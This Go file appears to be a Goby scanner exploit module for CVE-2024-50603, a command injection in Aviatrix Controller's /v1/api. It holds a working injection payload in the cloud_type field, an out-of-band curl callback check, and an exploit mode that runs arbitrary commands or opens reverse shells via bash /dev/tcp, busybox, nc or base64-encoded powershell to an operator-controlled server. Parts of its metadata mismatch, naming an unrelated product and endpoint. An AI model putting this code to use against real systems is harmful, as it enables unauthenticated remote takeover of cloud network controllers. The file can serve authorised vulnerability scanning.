package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Aviatrix Controller /v1/api Command Execution Vulnerability (CVE-2024-50603)",
    "Description": "<p>Aviatrix Controller is a powerful cloud network management platform that provides simplified cross-cloud network management, automated configuration, security policies, traffic monitoring, and more. It helps enterprises achieve more flexible, secure, and efficient cloud network architectures, especially suitable for multi-cloud and hybrid cloud environments. It is mainly used for orchestrating and managing various network and connectivity solutions. Aviatrix Controller versions are affected by a command injection vulnerability due to insufficient input validation in the cloud_type parameter of the list_flightpath_destination_instances operation or the src_cloud_type parameter of the flightpath_connection_test operation under /v1/api.</p>",
    "Product": "aVIaTrIX-Controller",
    "Homepage": "https://docs.aviatrix.com/documentation/latest/platform-administration/controller/index.html",
    "DisclosureDate": "2025-01-08",
    "PostTime": "2025-01-09",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "body=\"Aviatrix Controller\" && body=\"Content-Security-Policy\"",
    "GobyQuery": "body=\"Aviatrix Controller\" && body=\"Content-Security-Policy\"",
    "Level": "2",
    "Impact": "<p>Unauthenticated remote attackers can craft malicious requests to exploit this vulnerability to execute arbitrary commands, potentially leading to complete system compromise and posing a significant threat to enterprise cloud network security.</p>",
    "Recommendation": "<p>This vulnerability has been fixed. Affected users should upgrade to the following versions: Aviatrix Controller &gt;= 7.1.4191 or Aviatrix Controller 7.2.x &gt;= 7.2.4996.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/145018178?spm=1001.2014.3001.5502",
        ""
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command,Reverse",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Reverse",
            "type": "select",
            "value": "ByBash",
            "show": "Mode=Reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-50603"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "Aviatrix Controller /v1/api 命令执行漏洞（CVE-2024-50603）",
            "Product": "aVIaTrIX-Controller",
            "Description": "<p>Aviatrix Controller是一款强大的云网络管理平台，提供简化的跨云网络管理、自动化配置、安全策略、流量监控等功能，帮助企业实现更加灵活、安全和高效的云网络架构，特别适用于多云和混合云环境。主要用于编排和管理各种网络和连接解决方案。它为用户提供了一个直观、易用的界面，通过该界面可以轻松地配置、监控和管理复杂的网络环境。适用于各种复杂的网络环境。通过其提供的自动化、编排和安全功能，用户可以轻松地管理他们的网络环境，并快速响应各种网络需求。Aviatrix Controller受影响版本中，由于对/v1/api 下 list_flightpath_destination_instances 操作中的 cloud_type 参数或 flightpath_connection_test 操作中的 src_cloud_type 参数缺乏适当的输入清理，可能导致命令注入漏洞。</p>",
            "Recommendation": "<p>目前该漏洞已经修复，受影响用户可升级到以下版本：Aviatrix Controller &gt;= 7.1.4191 或 Aviatrix Controller 7.2.x &gt;= 7.2.4996。</p>",
            "Impact": "<p>未经身份验证的远程攻击者可以构造恶意请求，利用该漏洞执行任意命令，可能导致系统被完全控制，进一步威胁企业的云网络安全。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Aviatrix Controller /v1/api Command Execution Vulnerability (CVE-2024-50603)",
            "Product": "aVIaTrIX-Controller",
            "Description": "<p>Aviatrix Controller is a powerful cloud network management platform that provides simplified cross-cloud network management, automated configuration, security policies, traffic monitoring, and more. It helps enterprises achieve more flexible, secure, and efficient cloud network architectures, especially suitable for multi-cloud and hybrid cloud environments. It is mainly used for orchestrating and managing various network and connectivity solutions. Aviatrix Controller versions are affected by a command injection vulnerability due to insufficient input validation in the cloud_type parameter of the list_flightpath_destination_instances operation or the src_cloud_type parameter of the flightpath_connection_test operation under /v1/api.</p>",
            "Recommendation": "<p>This vulnerability has been fixed. Affected users should upgrade to the following versions: Aviatrix Controller &gt;= 7.1.4191 or Aviatrix Controller 7.2.x &gt;= 7.2.4996.</p>",
            "Impact": "<p>Unauthenticated remote attackers can craft malicious requests to exploit this vulnerability to execute arbitrary commands, potentially leading to complete system compromise and posing a significant threat to enterprise cloud network security.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": [
            "契约锁电子签章系统"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecNoEcho",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/sys/webservice/sysNotifyTodoWebService"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	//请求发送
	postOrGet_tBqLxxLZsDxzsfDWEFhakduwqjac := func(hostInfo *httpclient.FixUrl, command string) (err error) {
		// 文件上传
		postRequestConfig := httpclient.NewPostRequestConfig("/v1/api")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data = "action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(" + url.QueryEscape(strings.ReplaceAll(command, "+", "%2b")) + ")"

		// 请求头
		head := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}

		//发起请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response == nil {
			return err
		}

		if response.StatusCode != 200 {
			return errors.New("rce fail")
		}
		// 注意：返回值
		return nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：如果漏洞存在则设置的VulURL路径
			vulURL := "/v1/api"

			// 函数继承
			runPayload := postOrGet_tBqLxxLZsDxzsfDWEFhakduwqjac

			checkStr := goutils.RandomHexString(8)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			pocCommand := "curl  " + checkUrl
			if isDomain {
				// pocCommand = "ping -c 1 " + checkUrl
				pocCommand = "curl http://" + checkUrl
			}

			// 上传文件进行命令执行
			err := runPayload(u, pocCommand)
			if err != nil {
				return false
			}

			if godclient.PullExists(checkStr, time.Second*15) {
				//
				ss.VulURL = u.HostInfo + vulURL
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := postOrGet_tBqLxxLZsDxzsfDWEFhakduwqjac

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			ReverseTcpByBash := func(rp string) string {
				return fmt.Sprintf(`/bin/bash -c "/bin/bash -i >& /dev/tcp/%s/%s 0>&1"`, godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             ReverseTcpByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["Mode"])
			switch attackType {
			case "Command":
				//配置命令
				expCommand := goutils.B2S(ss.Params["Command"])
				err := runPayload(expResult.HostInfo, expCommand)
				if err != nil {
					expResult.Success = false
					expResult.Output = "执行失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = "执行成功，该漏洞无回显，请自行判断执行效果"
			case "Reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["Reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
